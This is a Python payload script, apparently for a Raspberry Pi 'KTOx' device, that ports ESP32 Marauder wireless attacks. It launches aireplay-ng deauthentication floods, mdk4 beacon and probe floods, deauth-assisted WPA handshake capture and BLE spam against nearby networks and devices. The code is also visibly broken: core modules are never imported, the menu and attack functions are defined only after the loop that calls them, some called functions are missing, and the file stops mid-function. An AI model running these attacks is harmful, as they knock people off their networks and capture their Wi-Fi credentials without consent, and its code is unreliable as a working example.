
#!/usr/bin/env python3
#
# KTOx Payload: Python Marauder
# A port of the ESP32 Marauder functionality to the KTOx platform.
# Adheres to the payload development guide.
#

import os
import sys
import traceback
import re
import shutil
import csv
import select
from PIL import Image, ImageDraw, ImageFont

# --- KTOx Path Setup ---
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
if '/root/KTOx' not in sys.path:
    sys.path.insert(0, '/root/KTOx')

# --- Hardware Imports ---
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config

# --- Global State ---
RUNNING = True
PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "PRESS": 13, "KEY3": 16}
LAST_PRESS_TIME = 0
DEBOUNCE_DELAY = 0.2
active_process = None

# --- Interfaces and Config ---
WIFI_INTERFACE = None
BT_INTERFACE = "hci0"
LOOT_PATH = os.path.join('/root/KTOx', "loot", "marauder")
WARDRIVE_PATH = os.path.join(LOOT_PATH, "wardrive")
HANDSHAKE_PATH = os.path.join(LOOT_PATH, "handshakes")

# --- Menu Definitions ---
MENU_ITEMS = ["Scan", "Attack", "Sniff", "Bluetooth", "Wardriving", "Settings", "Exit"]
SCAN_MENU_ITEMS = ["Scan APs", "Back"]
ATTACK_MENU_ITEMS = ["Deauth Attack", "Beacon Flood", "Probe Flood", "Auth Flood", "PMKID Capture", "Rick Roll", "Back"]
SNIFF_MENU_ITEMS = ["Capture Handshakes", "Sniff Probes", "Passive Capture", "Back"]
BT_MENU_ITEMS = ["Scan BLE Devices", "Detect Apple Devices", "Detect Card Skimmers", "BLE Spam Menu", "Back"]
SETTINGS_MENU_ITEMS = ["Set WiFi Channel", "Clear Logs", "System Info", "Reboot", "Shutdown", "Back"]
PROBE_FLOOD_SSIDS = ["xfinitywifi", "linksys", "Google Starbucks", "attwifi", "Wayport_Access", "Boingo Hotspot"]
RICK_ROLL_SSIDS = [
    "Never gonna give you up",
    "Never gonna let you down",
    "Never gonna run around",
    "and desert you",
    "Never gonna make you cry",
    "Never gonna say goodbye",
    "Never gonna tell a lie",
    "and hurt you",
]
BLE_SPAM_MENU_ITEMS = ["Apple Devices", "Android Devices", "Flipper Zero", "Back"]

# --- Hardware and Display Setup (Init First) ---
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
draw = ImageDraw.Draw(LCD.buffer)
font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
small_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)

# --- Logging ---
LOG_FILE = "/tmp/marauder_debug.log"
def log(message):
    with open(LOG_FILE, "a") as f:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] Marauder: {message}\n")

# --- UI & System Functions (Adapted from deauth.py) ---
def show_message(lines, color="white"):
    """Display multi-line message on the LCD."""
    if not draw or not lcd: return
    if isinstance(lines, str): lines = [lines]
    draw.rectangle((0, 0, LCD.width, LCD.height), outline=0, fill=0)
    y = 20
    for line in lines:
        draw.text((5, y), line, font=font, fill=color)
        y += 15
    LCD.ShowImage(LCD.buffer)

def show_status(message, duration=1):
    """Display a temporary status message."""
    if not draw or not lcd: return
    draw.rectangle((0, 110, 128, 128), fill="black")
    draw.text((5, 115), message, font=small_font, fill="CYAN")
    lcd.ShowImage(lcd.buffer)
    if duration:
        time.sleep(duration)

def run_command(cmd, timeout=10):
    """Execute shell command and return output."""
    try:
        process = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return process.stdout + process.stderr
    except subprocess.TimeoutExpired:
        return "Error: Command timed out"
    except Exception as e:
        return f"Error: {e}"

def check_dependencies():
    """Check for required command-line tools."""
    blespamer_path = os.path.join(os.path.dirname(__file__), "blespamer.py")
    if not os.path.exists(blespamer_path):
        return "blespamer.py"
    if shutil.which('mdk4') is None:
        return "mdk4"
    if shutil.which('airodump-ng') is None:
        return "airodump-ng"
    if shutil.which('aireplay-ng') is None:
        return "aireplay-ng"
    if shutil.which('hcitool') is None:
        return "hcitool"
    if shutil.which('hcxdumptool') is None:
        return "hcxdumptool"
    if shutil.which('hcxpcaptool') is None:
        return "hcxpcaptool"
    return None

def get_available_wifi_interfaces():
    """Gets available wlan interfaces."""
    output = run_command("iwconfig")
    interfaces = re.findall(r'^(\w+)\s+IEEE 802.11', output, re.MULTILINE)
    # Prioritize external dongles
    if 'wlan1' in interfaces:
        interfaces.remove('wlan1')
        interfaces.insert(0, 'wlan1')
    return interfaces

def setup_monitor_mode(interface):
    """Set up monitor mode on the WiFi interface, with user feedback."""
    global WIFI_INTERFACE
    log(f"Setting up monitor mode for {interface}")
    show_message([f"Setting up {interface}..."])

    # Check for onboard Raspberry Pi WiFi (known not to work)
    driver_check = run_command(f"ethtool -i {interface} 2>/dev/null")
    if "brcmfmac" in driver_check:
        log("Onboard RPi WiFi detected. Not supported.")
        show_message(["Onboard WiFi chip", "does not support", "monitor mode.", "Use a USB adapter."], "red")
        time.sleep(4)
        return False

    # Kill interfering processes
    show_message(["Stopping services..."])
    run_command("airmon-ng check kill")
    time.sleep(1)

    # Check if already in monitor mode
    iwconfig_result = run_command(f"iwconfig {interface}")
    if "Mode:Monitor" in iwconfig_result:
        log("Interface already in monitor mode.")
        WIFI_INTERFACE = interface
        return True

    # Try to enable monitor mode with airmon-ng
    show_message([f"Starting monitor", f"on {interface}..."])
    run_command(f"ip link set {interface} down")
    result = run_command(f"airmon-ng start {interface}", timeout=20)
    log(f"airmon-ng result: {result}")

    # Find the new monitor interface name (e.g., wlan1mon)
    mon_iface_match = re.search(r'monitor mode enabled on (\w+)', result)
    if mon_iface_match:
        mon_iface = mon_iface_match.group(1)
        if "No such device" not in run_command(f"iwconfig {mon_iface}"):
            WIFI_INTERFACE = mon_iface
            run_command(f"ip link set {WIFI_INTERFACE} up")
            log(f"Monitor mode enabled on {WIFI_INTERFACE}")
            return True

    # Fallback to iwconfig if airmon-ng fails
    log("airmon-ng failed, trying manual iwconfig method.")
    show_message(["Fallback: iwconfig"])
    run_command(f"ip link set {interface} down")
    run_command(f"iwconfig {interface} mode monitor")
    run_command(f"ip link set {interface} up")
    time.sleep(1)

    check_result = run_command(f"iwconfig {interface}")
    if "Mode:Monitor" in check_result:
        log("Monitor mode enabled via iwconfig.")
        WIFI_INTERFACE = interface
        return True

    log("Failed to enable monitor mode.")
    show_message(["Monitor mode FAILED.", "Check logs/adapter."], "red")
    time.sleep(3)
    return False

def cleanup(*_):
    global RUNNING, active_process, WIFI_INTERFACE
    if not RUNNING: return
    RUNNING = False
    log("Cleanup requested.")
    if active_process:
        try:
            log(f"Terminating active process PID: {active_process.pid}")
            os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
        except Exception as e:
            log(f"Error terminating process group: {e}")
            try: os.kill(active_process.pid, signal.SIGKILL)
            except: pass
    
    # Deactivate monitor mode
    if WIFI_INTERFACE:
        log(f"Deactivating monitor mode on {WIFI_INTERFACE}...")
        show_message(["Restoring WiFi..."])
        run_command(f"airmon-ng stop {WIFI_INTERFACE}", timeout=20)
        run_command("systemctl restart NetworkManager")
        WIFI_INTERFACE = None

    os.system(f"hcitool -i {BT_INTERFACE} dev down >/dev/null 2>&1")
    os.system(f"hcitool -i {BT_INTERFACE} dev up >/dev/null 2>&1")
    try:
        if 'lcd' in globals() and lcd is not None:
            lcd.clear()
        GPIO.cleanup()
    except Exception as e:
        log(f"Error during final GPIO cleanup: {e}")
    log("Cleanup complete.")
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def validate_setup():
    """
    Checks dependencies and sets up monitor mode.
    Returns True on success, False on failure.
    """
    global WIFI_INTERFACE
    log("Starting setup validation...")
    show_message(["Validating setup..."])

    # 1. Dependency Check
    log("Checking dependencies...")
    show_status("Checking tools...", 0)
    missing_dep = check_dependencies()
    if missing_dep:
        log(f"ERROR: Missing dependency: {missing_dep}")
        show_message([f"ERROR: Missing:", f"'{missing_dep}'"], "red")
        time.sleep(5)
        return False
    log("Dependencies OK.")
    show_status("Tools OK", 1)

    # 2. Interface Selection
    log("Getting available WiFi interfaces...")
    interfaces = get_available_wifi_interfaces()
    log(f"Interfaces found: {interfaces}")
    if not interfaces:
        log("ERROR: No WiFi adapters found.")
        show_message(["No WiFi adapters", "found!"], "red")
        time.sleep(3)
        return False

    selection = 0
    selected_interface = None
    log("Entering interface selection menu.")
    while not selected_interface:
        draw.rectangle((0,0,128,128), fill="black")
        draw.text((10, 5), "Select WiFi Adapter", font=font, fill="CYAN")
        for i, iface in enumerate(interfaces):
            display_y = 25 + (i * 15)
            if i == selection:
                draw.rectangle([(0, display_y - 2), (128, display_y + 12)], fill="BLUE")
                draw.text((10, display_y), f"> {iface}", font=small_font, fill="white")
            else:
                draw.text((20, display_y), iface, font=small_font, fill="white")
        LCD.ShowImage(LCD.buffer)

        # Simplified input handler for setup
        time.sleep(0.05)
        if GPIO.input(PINS["KEY3"]) == 0: return False
        if GPIO.input(PINS["DOWN"]) == 0:
            selection = (selection + 1) % len(interfaces)
            time.sleep(DEBOUNCE_DELAY)
        if GPIO.input(PINS["UP"]) == 0:
            selection = (selection - 1 + len(interfaces)) % len(interfaces)
            time.sleep(DEBOUNCE_DELAY)
        if GPIO.input(PINS["PRESS"]) == 0:
            selected_interface = interfaces[selection]
            time.sleep(DEBOUNCE_DELAY)
    log(f"Interface selected: {selected_interface}")

    # 3. Activate Monitor Mode
    if not setup_monitor_mode(selected_interface):
        return False

    log("Setup validation successful.")
    return True

if __name__ == "__main__":
    with open(LOG_FILE, "w") as f: f.write("Marauder Payload Log\n" + "="*20 + "\n")
    log("Payload started & hardware initialized.")
    
    try:
        if not validate_setup():
            show_message(["Setup Failed.", "Check logs."], "red")
            time.sleep(3)
            cleanup()

        log("Ensuring loot directories exist...")
        os.makedirs(WARDRIVE_PATH, exist_ok=True)
        os.makedirs(HANDSHAKE_PATH, exist_ok=True)
        os.makedirs(os.path.join(LOOT_PATH, "passive"), exist_ok=True)
        log("Loot directories ensured.")
        
        show_message([f"Monitor mode on:", f"{WIFI_INTERFACE}"], "lime")
        time.sleep(2)

        log("Entering main menu loop.")
        # --- Main Loop ---
        while RUNNING:
            item = show_menu(MENU_ITEMS, "Python Marauder")
            if not item or item == "Exit":
                break
            
            if item == "Scan":
                scan_item = show_menu(SCAN_MENU_ITEMS, "Scan Menu")
                if scan_item == "Scan APs":
                    scan_for_aps()
            elif item == "Attack":
                attack_item = show_menu(ATTACK_MENU_ITEMS, "Attack Menu")
                if attack_item == "Deauth Attack":
                    target_ap_object = scan_for_aps(as_target_selector=True)
                    if target_ap_object:
                        run_deauth_attack(target_ap_object)
                elif attack_item == "Beacon Flood":
                    run_beacon_flood(rick_roll=False)
                elif attack_item == "Probe Flood":
                    run_probe_flood()
                elif attack_item == "Auth Flood":
                    run_auth_flood()
                elif attack_item == "PMKID Capture":
                    run_pmkid_capture()
                elif attack_item == "Rick Roll":
                    run_beacon_flood(rick_roll=True)
            elif item == "Sniff":
                sniff_item = show_menu(SNIFF_MENU_ITEMS, "Sniff Menu")
                if sniff_item == "Capture Handshakes":
                    run_handshake_capture()
                elif sniff_item == "Sniff Probes":
                    run_probe_sniffer()
                elif sniff_item == "Passive Capture":
                    run_passive_capture()
            elif item == "Bluetooth":
                bt_item = show_menu(BT_MENU_ITEMS, "Bluetooth Menu")
                if bt_item == "Scan BLE Devices":
                    run_ble_scan()
                elif bt_item == "Detect Apple Devices":
                    run_apple_detection()
                elif bt_item == "Detect Card Skimmers":
                    run_skimmer_detection()
                elif bt_item == "BLE Spam Menu":
                    spam_item = show_menu(BLE_SPAM_MENU_ITEMS, "BLE Spam Menu")
                    if spam_item and spam_item != "Back":
                        run_ble_spam(spam_item)
            elif item == "Wardriving":
                run_wardriving()
            elif item == "Settings":
                settings_item = show_menu(SETTINGS_MENU_ITEMS, "Settings Menu")
                if settings_item == "Set WiFi Channel":
                    set_wifi_channel()
                elif settings_item == "Clear Logs":
                    clear_logs()
                elif settings_item == "System Info":
                    show_system_info()
                elif settings_item == "Reboot":
                    reboot_system()
                elif settings_item == "Shutdown":
                    shutdown_system()

    except Exception as e:
        log(f"FATAL: An unhandled exception occurred: {e}")
        with open(LOG_FILE, "a") as f:
            traceback.print_exc(file=f)
        try:
            show_message(["FATAL ERROR", "Check debug log"], "red")
        except:
            pass # LCD might be the issue
        time.sleep(5)
    finally:
        cleanup()

        # --- UI HELPER FUNCTIONS (Originals) ---
        def display_text(text, x, y, font_to_use=None, fill="WHITE"):
            draw.text((x, y), text, font=font_to_use if font_to_use else font, fill=fill)

        def update_screen():
            lcd.ShowImage(lcd.buffer)

        def clear_screen():
            draw.rectangle((0, 0, lcd.width, lcd.height), outline=0, fill=0)

        def draw_menu(menu_items, title, selection):
            clear_screen()
            display_text(title, 15, 5, font_to_use=font, fill="CYAN")
            draw.line([(0, 20), (128, 20)], fill="WHITE", width=1)
            start_index = max(0, selection - 3)
            end_index = min(len(menu_items), start_index + 6)
            for i in range(start_index, end_index):
                item = menu_items[i]
                display_y = 25 + ((i - start_index) * 15)
                if i == selection:
                    draw.rectangle([(0, display_y - 2), (128, display_y + 12)], fill="BLUE")
                    display_text(f"> {item}", 10, display_y, font_to_use=small_font)
                else:
                    display_text(item, 20, display_y, font_to_use=small_font)
            display_text("KEY3=Exit, LEFT=Back", 5, 115, font_to_use=small_font)
            update_screen()

        def handle_menu_input(selection, item_count):
            global LAST_PRESS_TIME
            while True:
                current_time = time.time()
                if (current_time - LAST_PRESS_TIME) < DEBOUNCE_DELAY:
                    time.sleep(0.05)
                    continue
                if GPIO.input(PINS["KEY3"]) == 0: cleanup()
                if GPIO.input(PINS["LEFT"]) == 0:
                    LAST_PRESS_TIME = current_time
                    return selection, "Back"
                if GPIO.input(PINS["DOWN"]) == 0:
                    LAST_PRESS_TIME = current_time
                    return (selection + 1) % item_count, None
                if GPIO.input(PINS["UP"]) == 0:
                    LAST_PRESS_TIME = current_time
                    return (selection - 1 + item_count) % item_count, None
                if GPIO.input(PINS["PRESS"]) == 0:
                    LAST_PRESS_TIME = current_time
                    return selection, "Select"
                time.sleep(0.05)
        
        def show_menu(menu_items, title):
            if not menu_items: return None
            selection = 0
            while True:
                draw_menu(menu_items, title, selection)
                selection, action = handle_menu_input(selection, len(menu_items))
                if action == "Back": return None
                if action == "Select": return menu_items[selection]

        def show_confirmation(prompt):
            choice = show_menu(["Confirm", "Cancel"], prompt)
            return choice == "Confirm"

        # --- FEATURE FUNCTIONS ---
        
        def scan_for_aps(as_target_selector=False):
            global active_process
            log("Starting AP scan.")
            clear_screen()
            display_text("Scanning for APs...", 10, 50)
            display_text(f"Interface: {WIFI_INTERFACE}", 10, 70, small_font)
            update_screen()
            scan_file_prefix = "/tmp/marauder_scan"
            os.system(f"rm -f {scan_file_prefix}*")
            
            ap_list = []
            try:
                cmd = ["airodump-ng", "-w", scan_file_prefix, "--output-format", "csv", "-a", WIFI_INTERFACE]
                active_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
                time.sleep(8) # Increased scan time
            finally:
                if active_process:
                    os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
                    active_process.wait()
                    active_process = None
            
            csv_filename = next((f"/tmp/{f}" for f in os.listdir("/tmp") if f.startswith("marauder_scan-") and f.endswith(".csv")), None)
            if csv_filename:
                try:
                    with open(csv_filename, 'r', newline='', errors='ignore') as f:
                        lines = f.readlines()
                        # Find the start of the AP list and client list
                        ap_list_start_index = -1
                        client_list_start_index = -1
                        for i, line in enumerate(lines):
                            if "BSSID, First time seen" in line:
                                ap_list_start_index = i
                            if "Station MAC, First time seen" in line:
                                client_list_start_index = i
                                break
                        
                        if ap_list_start_index != -1:
                            # Determine the end of the AP section
                            ap_list_end_index = client_list_start_index if client_list_start_index != -1 else len(lines)
                            ap_csv_lines = lines[ap_list_start_index:ap_list_end_index]

                            reader = csv.DictReader(l.replace('\0', '') for l in ap_csv_lines)
                            for row in reader:
                                essid = row.get(' ESSID', '').strip()
                                if essid and not essid.startswith('\\x00'):
                                    ap_list.append({
                                        'bssid': row['BSSID'].strip(),
                                        'power': row.get(' Power', '-').strip(),
                                        'channel': row.get(' channel', '-').strip(),
                                        'essid': essid
                                    })
                except Exception as e:
                    log(f"Error parsing scan results: {e}")

            log(f"AP scan found {len(ap_list)} networks.")
            
            if not ap_list:
                clear_screen()
                display_text("No APs found.", 20, 50)
                update_screen()
                time.sleep(2)
                return None

            essid_list = [ap['essid'] for ap in ap_list]
            selected_essid = show_menu(essid_list, "Select Target" if as_target_selector else "APs Found")

            if as_target_selector and selected_essid:
                # Find the full AP object that matches the selected ESSID
                return next((ap for ap in ap_list if ap['essid'] == selected_essid), None)
            
            return None # Return None if not selecting a target or if "Back" was chosen

        def run_deauth_attack(target_ap):
            global active_process
            if not target_ap: 
                log("Deauth attack skipped: no target selected.")
                return
            log(f"Starting deauth attack on {target_ap['bssid']}")
            clear_screen()
            display_text("Deauthing...", 25, 5, font_to_use=font, fill="RED")
            display_text(f"Target: {target_ap['essid'][:16]}", 5, 30, font_to_use=small_font)
            display_text(f"BSSID: {target_ap['bssid']}", 5, 50, font_to_use=small_font)
            display_text("Press KEY3 to Stop", 5, 110, font_to_use=small_font)
            update_screen()
            try:
                cmd = ["aireplay-ng", "--deauth", "0", "-a", target_ap['bssid'], WIFI_INTERFACE]
                active_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
                while GPIO.input(PINS["KEY3"]) != 0: 
                    if active_process.poll() is not None:
                        log("aireplay-ng process terminated unexpectedly.")
                        break
                    time.sleep(0.1)
            finally:
                if active_process and active_process.poll() is None:
                    os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
                    active_process.wait()
                active_process = None
            log("Deauth attack stopped.")
        
        def run_beacon_flood(rick_roll=False):
            global active_process
            ssid_list = RICK_ROLL_SSIDS if rick_roll else PROBE_FLOOD_SSIDS
            attack_name = "Rick Roll" if rick_roll else "Beacon Flood"
            
            log(f"Starting {attack_name}")
            clear_screen()
            display_text(attack_name, 25, 5, font_to_use=font, fill="RED")
            display_text("Flooding beacons...", 5, 30, font_to_use=small_font)
            display_text("Press KEY3 to Stop", 5, 110, font_to_use=small_font)
            update_screen()

            ssid_file_path = "/tmp/marauder_ssids.txt"
            with open(ssid_file_path, "w") as f:
                for ssid in ssid_list:
                    f.write(f"{ssid}\n")
            
            try:
                cmd = ["mdk4", WIFI_INTERFACE, "b", "-f", ssid_file_path, "-s", "100"]
                active_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
                while GPIO.input(PINS["KEY3"]) != 0:
                    if active_process.poll() is not None:
                        log("mdk4 process terminated unexpectedly.")
                        break
                    time.sleep(0.1)
            finally:
                if active_process and active_process.poll() is None:
                    os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
                    active_process.wait()
                active_process = None
            log(f"{attack_name} stopped.")

        def run_probe_flood():
            global active_process
            log("Probe flood requires a target.")
            target_ap = scan_for_aps(as_target_selector=True)
            if not target_ap:
                log("Probe flood cancelled: no target selected.")
                return

            log(f"Starting Probe Flood on {target_ap['bssid']}")
            clear_screen()
            display_text("Probe Flood", 25, 5, font_to_use=font, fill="RED")
            display_text(f"Target: {target_ap['essid'][:16]}", 5, 30, font_to_use=small_font)
            display_text("Press KEY3 to Stop", 5, 110, font_to_use=small_font)
            update_screen()

            ssid_file_path = "/tmp/marauder_ssids.txt"
            with open(ssid_file_path, "w") as f:
                for ssid in PROBE_FLOOD_SSIDS:
                    f.write(f"{ssid}\n")

            try:
                cmd = ["mdk4", WIFI_INTERFACE, "p", "-t", target_ap['bssid'], "-f", ssid_file_path]
                active_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
                while GPIO.input(PINS["KEY3"]) != 0:
                    if active_process.poll() is not None:
                        log("mdk4 process terminated unexpectedly.")
                        break
                    time.sleep(0.1)
            finally:
                if active_process and active_process.poll() is None:
                    os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
                    active_process.wait()
                active_process = None
            log("Probe flood stopped.")

        def run_handshake_capture():
            global active_process
            log("Handshake capture requires a target.")
            target_ap = scan_for_aps(as_target_selector=True)
            if not target_ap:
                log("Handshake capture cancelled: no target selected.")
                return

            log(f"Starting Handshake Capture on {target_ap['bssid']}")
            
            send_deauth = show_confirmation("Send deauth packets?")

            clear_screen()
            display_text("Capturing Handshake", 5, 5, font_to_use=font, fill="CYAN")
            display_text(f"Target: {target_ap['essid'][:16]}", 5, 30, font_to_use=small_font)
            display_text(f"Channel: {target_ap['channel']}", 5, 45, font_to_use=small_font)
            display_text("Press KEY3 to Stop", 5, 110, font_to_use=small_font)
            update_screen()

            # Set channel
            run_command(f"iwconfig {WIFI_INTERFACE} channel {target_ap['channel']}")
            
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            essid_name = "".join(c for c in target_ap['essid'] if c.isalnum())
            output_prefix = os.path.join(HANDSHAKE_PATH, f"hs_{essid_name}_{timestamp}")
            
            deauth_proc = None
            try:
                airodump_cmd = ["airodump-ng", "--bssid", target_ap['bssid'], "-c", target_ap['channel'], "-w", output_prefix, WIFI_INTERFACE]
                active_process = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
                
                if send_deauth:
                    deauth_cmd = ["aireplay-ng", "--deauth", "5", "-a", target_ap['bssid'], WIFI_INTERFACE]
                    deauth_proc = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)

                cap_file = f"{output_prefix}-01.cap"
                start_time = time.time()
                handshake_found = False
                while time.time() - start_time < 120 and not handshake_found:
                    if GPIO.input(PINS["KEY3"]) == 0:
                        log("Handshake capture cancelled by user.")
                        break
                    
                    display_text(f"Time: {int(time.time() - start_time)}s", 5, 90, font_to_use=small_font)
                    update_screen()

                    if os.path.exists(cap_file):
                        check_cmd = f"aircrack-ng {cap_file} 2>/dev/null | grep '1 handshake'"
                        if subprocess.run(check_cmd, shell=True).returncode == 0:
                            log(f"Handshake captured and saved to {cap_file}")
                            display_text("HANDSHAKE CAPTURED!", 5, 70, font_to_use=font, fill="LIME")
                            update_screen()
                            handshake_found = True
                            time.sleep(3)
                    
                    time.sleep(2)

                if not handshake_found:
                    log("Timeout reached, no handshake captured.")
                    display_text("Timeout - No handshake.", 5, 70, font_to_use=font, fill="RED")
                    update_screen()
                    time.sleep(3)

            finally:
                if active_process and active_process.poll() is None:
                    os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
                    active_process.wait()
                if deauth_proc and deauth_proc.poll() is None:
                    os.killpg(os.getpgid(deauth_proc.pid), signal.SIGTERM)
                    deauth_proc.wait()
                active_process = None
            log("Handshake capture stopped.")

        def run_probe_sniffer():
            global active_process
            log("Starting Probe Sniffer.")
            clear_screen()
            display_text("Sniffing Probes", 15, 5, font_to_use=font, fill="CYAN")
            display_text("Press KEY3 to Stop", 5, 110, font_to_use=small_font)
            update_screen()

            found_probes = set()
            try:
                cmd = ["airodump-ng", "--output-format", "csv", "-w", "/tmp/marauder_probes", WIFI_INTERFACE]
                active_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
                
                start_time = time.time()
                while time.time() - start_time < 120:
                    if GPIO.input(PINS["KEY3"]) == 0:
                        log("Probe sniffer cancelled by user.")
                        break

                    csv_filename = "/tmp/marauder_probes-01.csv"
                    if os.path.exists(csv_filename):
                        with open(csv_filename, 'r', newline='', errors='ignore') as f:
                            lines = f.readlines()
                            client_list_start_index = -1
                            for i, line in enumerate(lines):
                                if "Station MAC, First time seen" in line:
                                    client_list_start_index = i
                                    break
                            
                            if client_list_start_index != -1:
                                reader = csv.DictReader(l.replace('\0', '') for l in lines[client_list_start_index:])
                                for row in reader:
                                    probed_essid = row.get(' Probed ESSIDs', '').strip()
                                    client_mac = row.get('Station MAC', '').strip()
                                    if probed_essid and client_mac:
                                        found_probes.add(probed_essid)
                    
                    # Display found probes
                    draw.rectangle((0, 20, 128, 110), fill="black") # Clear probe area
                    display_y = 25
                    # Display last 5 found probes
                    for probe in sorted(list(found_probes))[-5:]:
                        draw.text((5, display_y), probe[:20], font=small_font, fill="WHITE")
                        display_y += 15
                    update_screen()

                    time.sleep(3)

            finally:
                if active_process and active_process.poll() is None:
                    os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
                    active_process.wait()
                active_process = None
                os.system("rm -f /tmp/marauder_probes*")
            log("Probe sniffer stopped.")

        def run_ble_scan():
            global active_process
            log("Starting BLE scan.")
            clear_screen()
            display_text("Scanning BLE...", 15, 5, font_to_use=font, fill="CYAN")
            display_text("Press KEY3 to Stop", 5, 110, font_to_use=small_font)
            update_screen()

            found_devices = {}
            try:
                # Ensure hci0 is up
                run_command(f"hciconfig {BT_INTERFACE} up")
                cmd = ["hcitool", "lescan", "--duplicates"]
                active_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, preexec_fn=os.setsid)
                
                start_time = time.time()
                while time.time() - start_time < 30: # Scan for 30 seconds
                    if GPIO.input(PINS["KEY3"]) == 0:
                        break
                    
                    # Non-blocking read
                    ready_to_read, _, _ = select.select([active_process.stdout], [], [], 0.1)
                    if ready_to_read:
                        line = active_process.stdout.readline()
                        if not line:
                            break
                        
                        parts = line.split()
                        if len(parts) >= 2:
                            mac = parts[0]
                            name = " ".join(parts[1:])
                            if "(unknown)" not in name and "n/a" not in name:
                                found_devices[mac] = name

                    # Update display periodically
                    if int(time.time()) % 3 == 0:
                        draw.rectangle((0, 20, 128, 110), fill="black")
                        display_y = 25
                        for mac, name in list(found_devices.items())[-5:]:
                            draw.text((5, display_y), f"{name[:12]}", font=small_font, fill="WHITE")
                            display_y += 15
                        update_screen()
                        time.sleep(1) # Prevent rapid screen flicker

            finally:
                if active_process and active_process.poll() is None:
                    os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
                    active_process.wait()
                active_process = None
            log(f"BLE scan found {len(found_devices)} devices.")
            show_message(["BLE Scan Complete"], "lime")
            time.sleep(2)

        def run_apple_detection():
            log("Starting Apple device detection.")
            clear_screen()
            display_text("Detecting Apple...", 10, 5, font_to_use=font, fill="CYAN")
            display_text("Scanning for 20s...", 5, 30, font_to_use=small_font)
            display_text("Press KEY3 to Stop", 5, 110, font_to_use=small_font)
            update_screen()
            
            run_command(f"hciconfig {BT_INTERFACE} up")
            output = run_command("timeout 20 hcitool lescan | grep -i 'Apple'", timeout=22)
            
            clear_screen()
            display_text("Apple Devices", 15, 5, font_to_use=font, fill="CYAN")
            if output and "Error" not in output:
                log(f"Found potential Apple devices:\n{output}")
                lines = output.strip().split('\n')
                display_y = 25
                for line in lines[:5]:
                    draw.text((5, display_y), line[:20], font=small_font, fill="WHITE")
                    display_y += 15
            else:
                log("No Apple devices detected.")
                display_text("No devices found.", 5, 40, font_to_use=small_font)
            update_screen()
            time.sleep(4)

        def run_skimmer_detection():
            log("Starting card skimmer detection.")
            clear_screen()
            display_text("Detecting Skimmers", 5, 5, font_to_use=font, fill="CYAN")
            display_text("Scanning for 20s...", 5, 30, font_to_use=small_font)
            display_text("Press KEY3 to Stop", 5, 110, font_to_use=small_font)
            update_screen()

            skimmer_names = ["HC-05", "HC-06", "Free-OTB"]
            grep_pattern = "|".join(skimmer_names)
            
            run_command(f"hciconfig {BT_INTERFACE} up")
            output = run_command(f"timeout 20 hcitool lescan | grep -iE '{grep_pattern}'", timeout=22)

            clear_screen()
            display_text("Skimmer Scan", 15, 5, font_to_use=font, fill="CYAN")
            if output and "Error" not in output:
                log(f"Found potential skimmers:\n{output}")
                lines = output.strip().split('\n')
                display_y = 25
                for line in lines[:5]:
                    draw.text((5, display_y), line[:20], font=small_font, fill="RED")
                    display_y += 15
            else:
                log("No potential skimmers detected.")
                display_text("No devices found.", 5, 40, font_to_use=small_font)
            update_screen()
            time.sleep(4)

        def run_ble_spam(spam_type):
            global active_process
            log(f"Starting BLE Spam: {spam_type}")
            clear_screen()
            display_text("BLE Spam", 25, 5, font_to_use=font, fill="RED")
            display_text(f"Type: {spam_type}", 5, 30, font_to_use=small_font)
            display_text("Press KEY3 to Stop", 5, 110, font_to_use=small_font)
            update_screen()

            spam_map = {
                "Apple Devices": "apple",
                "Android Devices": "android",
                "Flipper Zero": "flipper"
            }
            spam_arg = spam_map.get(spam_type, "apple") # Default to apple

            try:
                blespamer_path = os.path.join(os.path.dirname(__file__), "blespamer.py")
                cmd = ["python3", blespamer_path, "--type", spam_arg]
                active_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
                while GPIO.input(PINS["KEY3"]) != 0:
                    if active_process.poll() is not None:
                        log("blespamer.py process terminated unexpectedly.")
                        break
                    time.sleep(0.1)
            finally:
                if active_process and active_process.poll() is None:
                    os.killpg(os.getpgid(active_process.pid), signal.SIGTERM)
                    active_process.wait()
                active_process = None
            log("BLE Spam stopped.")

        def run_wardriving():
            global active_process
            log("Starting Wardriving session.")
            clear_screen()
            display_text("Wardriving", 25, 5, font_to_use=font, fill="CYAN")
            display_text("Press KEY3 to Stop", 5, 110, font_to_use=small_font)
